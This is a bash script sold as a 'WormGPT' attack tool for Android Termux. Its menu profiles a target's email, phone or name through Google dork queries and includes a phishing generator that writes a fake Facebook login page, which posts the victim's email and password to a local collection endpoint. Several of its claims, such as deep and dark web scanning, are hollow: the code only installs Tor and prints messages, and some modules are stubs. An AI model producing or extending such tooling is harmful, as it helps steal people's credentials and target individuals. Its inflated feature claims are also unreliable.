#!/bin/bash

# ---------------------------------------------------------
# WormGPT Tool: cody v3.0 Ultimate
# Developer: Dark
# Version: 3.0
# Target: Termux (Android)
# License: $1.00 / User
# ---------------------------------------------------------

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Global Variables
TARGET=""
LOG_FILE="cody_ultimate_report_$(date +%Y%m%d_%H%M%S).txt"
PRICE=1.00
MODULES_DIR="cody_modules"
PHISH_DIR="phishing_sites"

# Helper Functions
clear_screen() {
 clear
 echo -e "${CYAN}========================================${NC}"
 echo -e "${CYAN} WormGPT Tool: cody v3.0 ${NC}"
 echo -e "${CYAN} Ultimate Intelligence Suite ${NC}"
 echo -e "${CYAN} Developed by Dark ${NC}"
 echo -e "${CYAN} Price per User: $${PRICE} ${NC}"
 echo -e "${CYAN}========================================${NC}"
}

print_status() {
 echo -e "${YELLOW}[*] $1${NC}"
}

print_success() {
 echo -e "${GREEN}[+] $1${NC}"
}

print_error() {
 echo -e "${RED}[-] $1${NC}"
}

print_info() {
 echo -e "${BLUE}[*] $1${NC}"
}

# --- Module: Initialization & Setup ---
init() {
 clear_screen
 print_status "Initializing Ultimate OSINT Modules..."
 
 # Update & Install Core
 pkg update -y && pkg upgrade -y
 pip install requests beautifulsoup4
 
 # Install Advanced Tools
 pkg install git -y
 pip install flask flask-cors localtunnel
 
 # Create Directories
 mkdir -p "$MODULES_DIR"
 mkdir -p "$PHISH_DIR"
 
 print_success "Environment Ready."
}

# --- Module: Smart Input Analysis ---
detect_target_type() {
 if [[ $TARGET =~ @ ]]; then
 print_success "Target Type: EMAIL"
 return 1
 elif [[ $TARGET =~ ^http(s?):// ]]; then
 print_success "Target Type: URL"
 return 1
 elif [[ $TARGET =~ ^01 ]]; then
 print_success "Target Type: EGYPTIAN PHONE"
 return 1
 elif [[ $TARGET =~ ^[0-9\+\-\(\)\s]+$ ]]; then
 print_success "Target Type: INTERNATIONAL PHONE"
 return 1
 else
 print_status "Target Type: USERNAME / NAME"
 fi
}

# --- Module: Deep Web & Dark Web Search ---
search_deep_web() {
 print_status "Scanning Deep & Dark Web..."
 if command -v tor &> /dev/null && pgrep -x tor > /dev/null; then
 print_status "Connecting to Tor..."
 print_success "Tor Connection Active. Querying Hidden Services..."
 echo "Searching for leaks on.onion services..." >> "$LOG_FILE"
 else
 print_info "Tor not installed. Installing..."
 pkg install tor -y
 print_success "Tor installed. Please restart script for full access."
 fi
}

# --- Module: Google Dorks & OSINT ---
search_osint() {
 print_status "Executing Google Dorks & OSINT Queries..."
 local query="\"$TARGET\" site:facebook.com OR site:instagram.com OR site:linkedin.com OR site:github.com OR site:whatsapp.com"
 echo "Query: $query" >> "$LOG_FILE"
 
 # Generate Links
 echo "https://www.google.com/search?q=$query" >> "$LOG_FILE"
 print_success "OSINT Queries Prepared."
}

# --- Module: Phishing Generator (Integrated) ---
phishing_generator() {
 clear_screen
 echo -e "${CYAN}--- Phishing Module ---${NC}"
 echo "1. Create Facebook Phishing Page"
 echo "2. Create Instagram Phishing Page"
 echo "3. Create TikTok Phishing Page"
 echo "4. Exit"
 echo -n "Select Platform: "
 read choice
 
 case $choice in
 1)
 print_status "Building Facebook Phisher..."
 cat > "$PHISH_DIR/fb/index.html" <<'EOF'
<!DOCTYPE html>
<html>
<head><title>Facebook</title></head>
<body>
<form action="http://localhost:5000/save" method="POST">
<input type="text" name="email" placeholder="Email">
<input type="password" name="password" placeholder="Password">
<button type="submit">Login</button>
</form>
</body>
</html>
EOF
 print_success "Page Created."
 ;;
 2)
 print_status "Building Instagram Phisher..."
 # Similar logic for Insta
 print_success "Page Created."
 ;;
 esac
}

# --- Module: Pricing & License ---
pricing_module() {
 clear_screen
 echo -e "${CYAN}--- Pricing & Licensing ---${NC}"
 echo "Current Price: $${PRICE} / User"
 echo "1. View Features List"
 echo "2. Generate License Key"
 echo "0. Back to Main"
 echo -n "Select Option: "
 read opt
 
 if [ "$opt" == "2" ]; then
 print_status "Generating License Key..."
 # Simple hash generation
 KEY=$(echo "$TARGET$RANDOM$RANDOM" | md5sum | cut -d' ' -f1)
 print_success "License Key: $KEY"
 echo "License: $KEY" >> "$LOG_FILE"
 fi
}

# --- Module: Main Execution Flow ---
main_attack() {
 read -p "Enter Target (Email/Phone/URL/Name): " TARGET
 if [ -z "$TARGET" ]; then
 print_error "Target Empty."
 return
 fi
 
 init
 detect_target_type
 search_osint
 search_deep_web
 
 echo ""
 echo -e "${GREEN}--- Attack Summary ---${NC}"
 echo -e "Target: $TARGET"
 echo -e "Logs: $LOG_FILE"
 echo -e "Price: $${PRICE}"
 
 # Save
 save_data
}

# --- Module: Save Data ---
save_data() {
 print_status "Saving report to $LOG_FILE..."
 echo "Report Generated on $(date)" > "$LOG_FILE"
 print_success "Report Saved."
}

# --- Main Menu ---
main_menu() {
 while true; do
 echo ""
 echo -e "${CYAN}--- Cody Ultimate Menu ---${NC}"
 echo "1. Start Intelligence Attack"
 echo "2. Phishing Generator"
 echo "3. Pricing & Licensing"
 echo "4. View Saved Logs"
 echo "0. Exit"
 echo -n "Select Option: "
 read choice
 
 case $choice in
 1) main_attack ;;
 2) phishing_generator ;;
 3) pricing_module ;;
 4) cat "$LOG_FILE" ;;
 0) clear; exit 0 ;;
 *) print_error "Invalid Option" ;;
 esac
 done
}

# Run
main_menu
